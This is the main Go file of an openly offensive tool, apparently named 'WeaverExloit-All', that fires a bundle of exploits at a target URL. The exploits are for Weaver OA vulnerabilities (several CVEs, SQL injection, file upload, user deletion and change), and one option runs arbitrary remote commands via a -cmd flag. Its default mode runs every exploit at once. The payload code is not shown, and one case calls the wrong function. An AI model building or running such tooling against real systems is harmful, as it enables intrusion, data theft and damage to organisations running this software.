package main

import (
	"awesomeProject/poc"
	"flag"
	"fmt"
)

func Banner() {
	banner := `
 __          __                             ______               _         _  _   
 \ \        / /                            |  ____|             | |       (_)| |  
  \ \  /\  / /___   __ _ __   __ ___  _ __ | |__   __  __ _ __  | |  ___   _ | |_ 
   \ \/  \/ // _ \ / _` + ` |\ \ / // _ \| '__||  __|  \ \/ /| '_ \ | | / _ \ | || __|
    \  /\  /|  __/| (_| | \ V /|  __/| |   | |____  >  < | |_) || || (_) || || |_
     \/  \/  \___| \__,_|  \_/  \___||_|   |______|/_/\_\| .__/ |_| \___/ |_| \__|
							 | |
							 |_|
							    	   by:Redus
`
	fmt.Println(banner)
}

func Help() {
	help := `
WeaverExloit-All.exe -target http://127.0.0.1:8080/
WeaverExloit-All.exe -target http://127.0.0.1:8080/ -poc QVD-2023-5012
WeaverExloit-All.exe -target http://127.0.0.1:8080/ -poc CVE-2023-2523
WeaverExloit-All.exe -target http://127.0.0.1:8080/ -poc CVE-2023-2648
WeaverExloit-All.exe -target http://127.0.0.1:8080/ -poc getloginid_ofsLogin
WeaverExloit-All.exe -target http://127.0.0.1:8080/ -poc DeleteUserRequestInfoByXml
WeaverExloit-All.exe -target http://127.0.0.1:8080/ -poc WorkFlowServiceXml
WeaverExloit-All.exe -target http://127.0.0.1:8080/ -poc UploaderOperate
WeaverExloit-All.exe -target http://127.0.0.1:8080/ -poc FileDownloadForOutDocSQL
WeaverExloit-All.exe -target http://127.0.0.1:8080/ -poc E_Mobile_client  -cmd ipconfig
WeaverExloit-All.exe -target http://127.0.0.1:8080/ -poc EOfficeVUl
`
	fmt.Println(help)
}

func main() {
	target := flag.String("target", "", "指定目标")
	funcName := flag.String("poc", "", "指定要执行的函数名称")
	command := flag.String("cmd", "whoami", "执行命令")
	flag.Parse()
	if *target == "" {
		Banner()
		Help()
	} else {
		switch *funcName {
		case "QVD-2023-5012":
			poc.CVE_2023_2523(*target)
		case "CVE-2023-2523":
			poc.CVE_2023_2523(*target)
		case "CVE-2023-2648":
			poc.CVE_2023_2648(*target)
		case "ChangeUserInfo":
			poc.ChangeUserInfo(*target)
		case "getloginid_ofsLogin":
			for i := 0; i < 10; i++ {
				poc.Getloginid(*target, "", i)
			}
		case "UploaderOperate":
			poc.UploaderOperate(*target)
		case "WorkFlowServiceXml":
			poc.WorkFlowServiceXml(*target)
		case "DeleteUserRequestInfoByXml":
			poc.DeleteUserRequestInfoByXml(*target)
		case "FileDownloadForOutDocSQL":
			poc.FileDownloadForOutDocSQL(*target)
		case "E_Mobile_client":
			poc.E_Mobile_client(*target, *command)
		case "EOfficeVUl":
			poc.EOfficeVUl(*target)
		default:
			poc.ChangeUserInfo(*target)
			poc.QVD_2023_5012(*target)
			poc.CVE_2023_2523(*target)
			poc.CVE_2023_2648(*target)
			poc.WorkFlowServiceXml(*target)
			poc.UploaderOperate(*target)
			poc.DeleteUserRequestInfoByXml(*target)
			poc.FileDownloadForOutDocSQL(*target)
			poc.E_Mobile_client(*target, *command)
			poc.EOfficeVUl(*target)
		}
	}

}
